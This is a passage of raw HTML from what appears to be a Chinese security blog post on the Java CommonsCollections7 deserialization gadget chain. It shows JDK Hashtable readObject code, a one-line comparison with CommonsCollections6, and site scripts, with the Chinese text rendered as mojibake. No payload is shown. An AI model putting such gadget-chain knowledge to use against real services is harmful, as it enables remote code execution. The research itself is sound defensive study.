</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>for</span><span class=w> </span><span class=p>(;</span><span class=w> </span><span class=n>elements</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w> </span><span class=n>elements</span><span class=o>--</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=nd>@SuppressWarnings</span><span class=p>(</span><span class=s>&#34;unchecked&#34;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>K</span><span class=w> </span><span class=n>key</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>K</span><span class=p>)</span><span class=n>s</span><span class=p>.</span><span class=na>readObject</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=nd>@SuppressWarnings</span><span class=p>(</span><span class=s>&#34;unchecked&#34;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>V</span><span class=w> </span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>V</span><span class=p>)</span><span class=n>s</span><span class=p>.</span><span class=na>readObject</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=c1>// sync is eliminated for performance</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>reconstitutionPut</span><span class=p>(</span><span class=n>table</span><span class=p>,</span><span class=w> </span><span class=n>key</span><span class=p>,</span><span class=w> </span><span class=n>value</span><span class=p>);</span><span class=w> </span><span class=c1>//1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>CommonsCollections7å’Œ6çš„åŒºåˆ«ä¸»è¦æ˜¯ä½¿ç”¨äº†Hashtableï¼Œä»£ç å…³é”®åœ¨äºæ³¨é‡Š1å’Œ2å¤„ã€‚</p></section><footer class=article-footer><section class=article-tags><a href=/tags/commonscollections/>CommonsCollections</a>
<a href=/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/>Javaååºåˆ—åŒ–</a></section><section class=article-lastmod><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<span>æœ€åæ›´æ–°äº Oct 04, 2024 02:24 +0800</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>ç›¸å…³æ–‡ç« </h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/post/java-reflection-1ypwc3.html><div class=article-image><img src=https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/20241123185908.jpg loading=lazy data-key=java-reflection-1ypwc3 data-hash=https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/20241123185908.jpg></div><div class=article-details><h2 class=article-title>Javaåå°„</h2></div></a></article></div></div></aside><script src=https://utteranc.es/client.js repo=lantern-lab/lantern-lab.github.io issue-term=pathname crossorigin=anonymous async></script><style>.utterances{max-width:unset}</style><script>let utterancesLoaded=!1;function setUtterancesTheme(e){let t=document.querySelector(".utterances iframe");t&&t.contentWindow.postMessage({type:"set-theme",theme:`github-${e}`},"https://utteranc.es")}addEventListener("message",e=>{if(e.origin!=="https://utteranc.es")return;utterancesLoaded=!0,setUtterancesTheme(document.documentElement.dataset.scheme)}),window.addEventListener("onColorSchemeChange",e=>{if(!utterancesLoaded)return;setUtterancesTheme(e.detail)})</script><footer class=site-footer><section class=copyright>&copy;
2024 -
2026 é­”ä»™æ£’æ£’ä¹‹ä¸»</section><section class=powerby>ä½¿ç”¨ <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> æ„å»º<br>ä¸»é¢˜ <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> ç”± <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> è®¾è®¡</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>